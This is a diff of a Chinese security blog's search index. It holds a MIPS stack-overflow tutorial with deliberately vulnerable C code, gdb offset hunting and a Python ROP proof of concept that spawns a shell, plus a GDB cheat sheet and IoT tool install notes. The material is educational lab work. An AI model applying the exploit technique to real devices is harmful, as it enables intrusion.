+        return 1;
+
+    if ((fp = fopen(&quot;passwd&quot;, &quot;rb&quot;)) == NULL)
+    {
+        printf(&quot;Cannot open file passwd! \n&quot;);
+        exit(1);
+    }
+
+    ch = fgetc(fp);
+    while(count &lt;= fileLen){
+        buf[count++] = ch;
+        ch = fgetc(fp);
+    }
+    buf[--count] = &#39;\x00&#39;;
+
+    if (!strcmp(buf, &quot;adminpwd&quot;))
+    {
+        do_system(count, &quot;ls -l&quot;);
+    }
+    else
+    {
+        printf(&quot;you have an invalid password!\n&quot;);
+    }
+    fclose(fp);
+
+}</code></pre>
 <p>使用mipsls-linux-gcc来编译程序</p>
 <blockquote>
 <p>mipsel-linux-gcc -g crash.c -static -o vuln_system</p>
@@ -846,7 +1427,16 @@
 <li>-g 指定<code>qemu-mipsel</code>远程调试端口</li>
 </ul>
 <p>设置<code>gdb</code></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./vuln_system</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开gdb后进行如下设置</span></span><br><span class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> endian little <span class="comment">#设置小端序</span></span></span><br><span class="line">The target is assumed to be little endian</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">set</span> architecture mips <span class="comment">#设置为Mips架构</span></span></span><br><span class="line">The target architecture is assumed to be mips</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> target remote localhost:1234 <span class="comment">#设置远程端口</span></span></span><br></pre></td></tr></table></figure>
+<pre><code class="shell">gdb-multiarch ./vuln_system
+
+# 打开gdb后进行如下设置
+
+pwndbg&gt; set endian little #设置小端序
+The target is assumed to be little endian
+pwndbg&gt; set architecture mips #设置为Mips架构
+The target architecture is assumed to be mips
+pwndbg&gt; target remote localhost:1234 #设置远程端口
+</code></pre>
 <p><img src="http://file.smilehacker.net/Gdbset.png" alt="GDB调试设置"></p>
 <p>现在重新生成<code>passwd</code>文件,使用python向文件中写入600个A</p>
 <blockquote>
@@ -859,16 +1449,30 @@
 <h5 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h5><p>通过静态分析发现,如果要使缓冲区溢出,并控制到堆栈中的返回地址saved_ra,需要覆盖的数据大小应该达到0x1A0-0x04即0x19c字节;作者这里运用这个公式的依据是什么呢?让我们回顾一下X86架构下的情形:</p>
 <p>偏移不就是找buf和ra之间的偏移么,ra是存储于栈里面的(有点类似于x86里面的ret指令),buf指向栈里面,只要计算出buf的初始位置和ra之间的偏移,就可以计算出有多少个字节就可以溢出到ra了！</p>
 <h5 id="寻找偏移"><a href="#寻找偏移" class="headerlink" title="寻找偏移"></a>寻找偏移</h5><p><img src="http://file.smilehacker.net/findoffest.png" alt="寻找偏移"></p>
-<figure class="highlight mips"><table><tr><td class="code"><pre><span class="line">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0</span><br><span class="line">sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为											0x1D0+var_4</span><br><span class="line">sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8</span><br><span class="line">move    $fp, $sp                //fp&lt;== sp</span><br><span class="line">li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面</span><br><span class="line">sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为										0x1D0+var_1C0</span><br><span class="line">addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值</span><br><span class="line">li      $v1, 0x100        //将立即数0x100传入v1</span><br><span class="line">move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数</span><br><span class="line">move    $a1, $zero        //zero寄存器里面永远为0</span><br><span class="line">move    $a0, $v0          //a0=v0</span><br><span class="line">la      $v0, memset      //复制memset地址至至v0中</span><br><span class="line">move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量</span><br><span class="line">bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放								于Ra里面</span><br><span class="line"><span class="keyword">nop</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="Mips">addiu   $sp, -0x1D0            //sp &lt;==sp-0x1D0
+sw      $ra, 0x1D0+var_4($sp)  //将ra里面的值存放于堆栈里面,其偏移值为                                            0x1D0+var_4
+sw      $fp, 0x1D0+var_8($sp)  //将fp里面的值存放于堆栈里面,其偏移为0x1D0+var_8
+move    $fp, $sp                //fp&lt;== sp
+li      $gp, 0x4291A0           //li指令:将一个立即数存放于寄存器里面
+sw      $gp, 0x1D0+var_1C0($sp) //将gp里面的值存放于堆栈里面,其偏移为                                        0x1D0+var_1C0
+addiu   $v0, $fp, 0x1D0+var_1A0    //v0用于存放函数函数返回值
+li      $v1, 0x100        //将立即数0x100传入v1
+move    $a2, $v1          //MIPS架构中一般使用a0-a3作为函数的前4个参数
+move    $a1, $zero        //zero寄存器里面永远为0
+move    $a0, $v0          //a0=v0
+la      $v0, memset      //复制memset地址至至v0中
+move    $t9, $v0         //$t0-$t9供汇编程序使用的临时变量
+bal     memset           //无条件转移,并且将转移指令后面的第二条地址作为返回值存放                                于Ra里面
+nop</code></pre>
 <p>结合源代码看,可以发现主函数里面调用的第一个函数为<code>memset</code>函数,但是源代码中没有调用这个函数,发现在调用这个函数之前是调用了3个参数的,分别用到<code>a0</code>,<code>a1</code>,和<code>a2</code>这几个寄存器,而函数<code>memset</code>的原型为<code>void* memset(void* s,int ch,unsigned n)</code>，其主要功能为:在内存空间里以s为起始的地方,将开始的n个字节设为指定值;可以发现传给<code>a2</code>的值为<code>v1</code>,而传给<code>$v1</code>的为<code>0x100</code>(0x100实际上就是十进制256),这里在做的事情是内存初始化,通过这个函数将内存里面的<code>256</code>个字节初始化为<code>0</code>,而这里的内存初始地址是通过指令<code>addiu $v0,$fp,0x1D0+var_1A0</code>来确定的,显然,<code>0x1D0+var_1A0</code>就是我们要找的buf的起始偏移，到这里,我们才能确定:需要覆盖的数据大小应该为<code>0x1D0+var_1A0-0x1D0-var_4</code>即<code>0x19c</code>字节;</p>
 <h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>我们将0x19C以后的数据设置成<code>BBBB</code>(0x42424242),如果我们猜测正确,那程序会被劫持到0x424242处</p>
 <blockquote>
 <p>tt@ubuntu:~$ python -c “print ‘A’*0x19c + ‘BBBB’+’CCCC’”&gt;passwd</p>
 </blockquote>
 <p>接下来使用GDB查看main函数的代码，并在main函数结尾处下断点</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">disassemble main # 查看main函数的汇编代码</span><br><span class="line"></span><br><span class="line">break *main+740 # 在main函数后740行处下断点</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">disassemble main # 查看main函数的汇编代码
 
+break *main+740 # 在main函数后740行处下断点</code></pre>
 <p><img src="http://file.smilehacker.net/gccbreaks.png" alt="汇编下断点"></p>
 <p>断点下好后输入<code>c</code>,让程序运行到刚刚下的断点处</p>
 <p><img src="http://file.smilehacker.net/return.png" alt="继续运行"></p>
@@ -882,8 +1486,32 @@
 <p>在缓冲区溢出时,直接让<code>ra</code>的值指向<code>0x00401FA0</code>,<strong>因为<code>ROP技术</code>使用的堆栈都是同一个堆栈</strong>，只要让<code>$sp+0x58+var_40</code>的值为想要执行的命令,并且在<code>$sp+0x58+var_4</code>处的值存放成跳转到<code>do_system_0</code>函数的地址(<code>0x00400678</code>),就可以达到目的。</p>
 <p><img src="http://file.smilehacker.net/RAreturn.png" alt="设置RA的值"></p>
 <p>现在整理一下当前栈帧:<br><img src="http://file.smilehacker.net/stackinfo.png" alt="当前栈帧"></p>
-<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">struct.pack("&lt;L","xxx")为小端序</span></span><br><span class="line"><span class="string">struct.pack("&gt;L","xxx")为大端序</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"> </span><br><span class="line">cmd = <span class="string">"sh"</span> 				<span class="comment"># command string</span></span><br><span class="line">cmd += <span class="string">"\x00"</span>*(<span class="number">4</span> - (len(cmd) % <span class="number">4</span>))	<span class="comment"># align by 4 bytes</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#shellcode</span></span><br><span class="line">shellcode = <span class="string">"A"</span>*<span class="number">0x19C</span> 			<span class="comment"># padding buf</span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00401FA0</span>) </span><br><span class="line">shellcode += <span class="string">"A"</span>*<span class="number">24</span>				<span class="comment"># padding before command</span></span><br><span class="line">shellcode += cmd				<span class="comment"># command($a1)</span></span><br><span class="line">shellcode += <span class="string">"B"</span>*(<span class="number">0x3C</span> - len(cmd))		<span class="comment"># padding </span></span><br><span class="line">shellcode += struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x00400678</span>) </span><br><span class="line">shellcode += <span class="string">"BBBB"</span>				<span class="comment"># padding</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#create password file</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] create password file'</span>,</span><br><span class="line">fw = open(<span class="string">'passwd'</span>,<span class="string">'w'</span>)</span><br><span class="line">fw.write(shellcode)<span class="comment">#'A'*300+'\x00'*10+'BBBB')</span></span><br><span class="line">fw.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">' ok!'</span></span><br></pre></td></tr></table></figure>
+<h4 id="整理POC"><a href="#整理POC" class="headerlink" title="整理POC"></a>整理POC</h4><pre><code class="python">&quot;&quot;&quot;
+struct.pack(&quot;&lt;L&quot;,&quot;xxx&quot;)为小端序
+struct.pack(&quot;&gt;L&quot;,&quot;xxx&quot;)为大端序
+&quot;&quot;&quot;
+import struct
 
+cmd = &quot;sh&quot;                 # command string
+cmd += &quot;\x00&quot;*(4 - (len(cmd) % 4))    # align by 4 bytes
+
+#shellcode
+shellcode = &quot;A&quot;*0x19C             # padding buf
+shellcode += struct.pack(&quot;&lt;L&quot;,0x00401FA0) 
+shellcode += &quot;A&quot;*24                # padding before command
+shellcode += cmd                # command($a1)
+shellcode += &quot;B&quot;*(0x3C - len(cmd))        # padding 
+shellcode += struct.pack(&quot;&lt;L&quot;,0x00400678) 
+shellcode += &quot;BBBB&quot;                # padding
+
+print &#39; ok!&#39;
+
+#create password file
+print &#39;[+] create password file&#39;,
+fw = open(&#39;passwd&#39;,&#39;w&#39;)
+fw.write(shellcode)#&#39;A&#39;*300+&#39;\x00&#39;*10+&#39;BBBB&#39;)
+fw.close()
+print &#39; ok!&#39;</code></pre>
 <p>将上述代码保存为<code>poc.py</code>,运行结果如下</p>
 <p><img src="http://file.smilehacker.net/result.png" alt="result"></p>
 <p>成功拿到shell</p>
@@ -896,8 +1524,8 @@
         <category>IoT</category>
       </categories>
       <tags>
-        <tag>调试</tag>
         <tag>IoT</tag>
+        <tag>调试</tag>
         <tag>Debug</tag>
         <tag>Mips</tag>
         <tag>溢出</tag>
@@ -908,25 +1536,24 @@
     <url>/post/25086.html</url>
     <content><![CDATA[<h2 id="GDB调试命令记录-持续更新"><a href="#GDB调试命令记录-持续更新" class="headerlink" title="GDB调试命令记录(持续更新)"></a>GDB调试命令记录(持续更新)</h2><p>记录一些GDB调试的命令,好记性不如烂笔头</p>
 <h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>pwndbg</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh</code></pre>
 <p>如果安装了pwndbg,这样可以省调我们很多gdb的命令操作, 运行界面如下</p>
 <a id="more"></a>
 
 <p><img src="http://file.smilehacker.net/1570720622109.png" alt="pwndbg界面展示"></p>
 <h2 id="启动GDB"><a href="#启动GDB" class="headerlink" title="启动GDB"></a>启动GDB</h2><p>对C/C++程序的调试，需要在编译前就加上-g选项:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$g</span>++ -g hello.cpp -o hello</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">$g++ -g hello.cpp -o hello</code></pre>
 <p>调试可执行文件:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gdb</span> &lt;program&gt;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">$gdb &lt;program&gt;</code></pre>
 <p>program也就是你的执行文件，一般在当前目录下。</p>
 <p>调试core文件(core是程序非法执行后core dump后产生的文件):</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gdb</span> &lt;program&gt; &lt;core dump file&gt;</span><br><span class="line"><span class="variable">$gdb</span> program core.11127</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">$gdb &lt;program&gt; &lt;core dump file&gt;
+$gdb program core.11127</code></pre>
 <p>调试服务程序:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$gdb</span> &lt;program&gt; &lt;PID&gt;</span><br><span class="line"><span class="variable">$gdb</span> hello 11127</span><br></pre></td></tr></table></figure>
-
+<pre><code class="bash">$gdb &lt;program&gt; &lt;PID&gt;
+$gdb hello 11127</code></pre>
 <p>如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。</p>
 <h2 id="gdb交互命令"><a href="#gdb交互命令" class="headerlink" title="gdb交互命令"></a>gdb交互命令</h2><p>启动gdb后，进入到交互模式，通过以下命令完成对程序的调试；注意高频使用的命令一般都会有缩写，熟练使用这些缩写命令能提高调试的效率；</p>
 <h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><ul>
@@ -1005,11 +1632,10 @@
 <p>例如:</p>
 <p><img src="http://file.smilehacker.net/1570722300144.png" alt="汇编断点调试"></p>
 <h3 id="GDB中使用管道进行调试"><a href="#GDB中使用管道进行调试" class="headerlink" title="GDB中使用管道进行调试"></a>GDB中使用管道进行调试</h3><p>输入的不是参数，而是标准输入(stdin)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ./vuln_prog</span><br><span class="line">run &lt; filename_with_input</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">gdb ./vuln_prog
+run &lt; filename_with_input</code></pre>
 <h3 id="GDB-查看栈帧多行数据"><a href="#GDB-查看栈帧多行数据" class="headerlink" title="GDB 查看栈帧多行数据"></a>GDB 查看栈帧多行数据</h3><p>可以清楚看到栈帧里面的情况，一目了然，前面搞死人了</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">stack n[要查看具体多少]</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">stack n[要查看具体多少]</code></pre>
 <p><img src="http://file.smilehacker.net/1571206209216.png" alt="查看堆栈"></p>
 ]]></content>
       <categories>
@@ -1018,8 +1644,8 @@
       </categories>
       <tags>
         <tag>安全</tag>
-        <tag>GDB</tag>
         <tag>调试</tag>
+        <tag>GDB</tag>
       </tags>
   </entry>
   <entry>
@@ -1037,22 +1663,49 @@
 <li>GDBServer </li>
 </ul>
 <a id="more"></a>
-<h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential autoconf git <span class="comment">#安装依赖 </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/devttys0/binwalk/blob/master/INSTALL.md  </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> binwalk  </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> python2.7 </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo python setup.py install </span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Python3.x</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo python3 setup.py install</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./deps.sh <span class="comment">#debian/Ubuntu可使用脚本自动安装依赖</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a>Binwalk</h2><pre><code class="shell">$ sudo apt-get update  
+$ sudo apt-get install build-essential autoconf git #安装依赖 
 
+# https://github.com/devttys0/binwalk/blob/master/INSTALL.md  
+$ git clone https://github.com/ReFirmLabs/binwalk.git
+$ cd binwalk  
+
+# python2.7 
+$ sudo python setup.py install 
+
+# Python3.x
+$ sudo python3 setup.py install
+
+$ sudo ./deps.sh #debian/Ubuntu可使用脚本自动安装依赖</code></pre>
 <h2 id="Qemu"><a href="#Qemu" class="headerlink" title="Qemu"></a>Qemu</h2><p>Qemu 是纯软件实现的虚拟化模拟器，几乎可以模拟任何硬件设备。 QEMU模拟器主要有两种比较常见的运作模式：</p>
 <ul>
 <li>User Mode（使用者模式） User Mode模式下，用户只需要将各种不同平台的处理编译得到的Linux程序放在QEMU虚拟中运行即可，其他的事情全部由QEMU虚拟机来完成，不需要用户自定义内核和虚拟磁盘等文件；</li>
 <li>System Mode（系统模式）。 System Mode模式下，最明显的特点是用户可以为QEMU虚拟机指定运行的内核或者虚拟硬盘等文件，简单来说系统模式下QEMU虚拟机是可根据用户的要求配置的</li>
 </ul>
-<h3 id="使用源码安装Qemu"><a href="#使用源码安装Qemu" class="headerlink" title="使用源码安装Qemu"></a>使用源码安装Qemu</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git://git.qemu.org/qemu.git</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> qemu</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git submodule update --recursive</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install libglib2.0 libglib2.0-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install autoconf automake libtoolcd </span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make &amp;&amp; sudo make install</span></span><br></pre></td></tr></table></figure>
+<h3 id="使用源码安装Qemu"><a href="#使用源码安装Qemu" class="headerlink" title="使用源码安装Qemu"></a>使用源码安装Qemu</h3><pre><code class="shell">$ git clone git://git.qemu.org/qemu.git
 
+$ cd qemu
+
+$ git submodule update --recursive
+$ sudo apt install libglib2.0 libglib2.0-dev
+$ sudo apt install autoconf automake libtoolcd 
+
+$ ./configure
+
+$ sudo make &amp;&amp; sudo make install</code></pre>
 <p>ubuntu14.04中用源码方式编译安装qemu时,执行configure步骤提示错误：“ERROR: pixman &gt;= 0.21.8 not present.” 安装如下依赖：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libpixman-1-dev</span></span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">$ sudo apt-get install libpixman-1-dev</code></pre>
 <h2 id="firmadyne"><a href="#firmadyne" class="headerlink" title="firmadyne"></a>firmadyne</h2><p>github : <a href="https://github.com/firmadyne/firmadyne" target="_blank" rel="noopener">https://github.com/firmadyne/firmadyne</a></p>
 <h2 id="Buildroot"><a href="#Buildroot" class="headerlink" title="Buildroot"></a>Buildroot</h2><p>下载地址 : <a href="https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz" target="_blank" rel="noopener">https://buildroot.org/downloads/buildroot-2019.02.6.tar.gz</a></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar zxvf buildroot-2019.02.6.tar.gz</span><br><span class="line"></span><br><span class="line">cd buildroot-2019.02.6</span><br><span class="line"></span><br><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line"></span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">tar zxvf buildroot-2019.02.6.tar.gz
 
+cd buildroot-2019.02.6
+
+sudo apt-get install libncurses5-dev patch
+
+make clean
+
+make menuconfig</code></pre>
 <p>需要设置以下三个选项<br><img src="http://file.smilehacker.net/buildroot_set1.png" alt="buildroot安装选项"></p>
 <ul>
 <li>Target options -&gt; Target Architecture 设置为Mips (little endian)</li>
@@ -1060,28 +1713,36 @@
 <li>Toolchain -&gt; Kernal Headers 设置成机器Kennal版本</li>
 </ul>
 <p>选择Save保存, 之后开始编译,</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo make</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sudo make</code></pre>
 <p>经过一个小时的编译，在目录下产生一个<code>output</code>的目录。编译产生的工具在<code>output/host/usr/bin</code>目录下</p>
 <h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>一般的Linux平台下自带了GDB</p>
 <p>调试MIPS平台的程序，需要安装gdb-multiarch</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">sudo apt install gdb-multiarch</code></pre>
 <p>然后按照正常的GDB使用即可</p>
 <h3 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h3><p>一个类似于 peda的gdb插件，支持多种架构，pwn最强gdb插件。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
-
+<pre><code class="shell">git clone https://github.com/pwndbg/pwndbg
+cd pwndbg
+./setup.sh</code></pre>
 <h2 id="IDA-Linux"><a href="#IDA-Linux" class="headerlink" title="IDA(Linux)"></a>IDA(Linux)</h2><p>链接：<a href="https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw" target="_blank" rel="noopener">https://pan.baidu.com/s/1PIh-EK7UOqsWi5kDy5QgCw</a><br>提取码：076v </p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg --add-architecture i386</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装IDA插件:</span></span><br><span class="line">git clone https://github.com/devttys0/ida.git</span><br><span class="line"></span><br><span class="line">cd plugins</span><br><span class="line"></span><br><span class="line">python install.py /IDA PATH/ --install</span><br></pre></td></tr></table></figure>
+<pre><code class="shell">$ sudo dpkg --add-architecture i386
+$ sudo apt-get update
+$ sudo apt-get install libc6-i686:i386 libexpat1:i386 libffi6:i386 libfontconfig1:i386 libfreetype6:i386 libgcc1:i386 libglib2.0-0:i386 libice6:i386 libpcre3:i386 libpng12-0:i386 libsm6:i386 libstdc++6:i386 libuuid1:i386 libx11-6:i386 libxau6:i386 libxcb1:i386 libxdmcp6:i386 libxext6:i386 libxrender1:i386 zlib1g:i386 libx11-xcb1:i386 libdbus-1-3:i386 libxi6:i386 libsm6:i386 
 
+
+# 安装IDA插件:
+git clone https://github.com/devttys0/ida.git
+
+cd plugins
+
+python install.py /IDA PATH/ --install </code></pre>
 <h2 id="GDBServer"><a href="#GDBServer" class="headerlink" title="GDBServer"></a>GDBServer</h2><p>各个版本的GDBServer下载地址 <a href="https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver" target="_blank" rel="noopener">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>
 ]]></content>
       <categories>
         <category>安全</category>
       </categories>
       <tags>
-        <tag>安全</tag>
         <tag>IoT</tag>
+        <tag>安全</tag>
       </tags>
   </entry>
 </search>
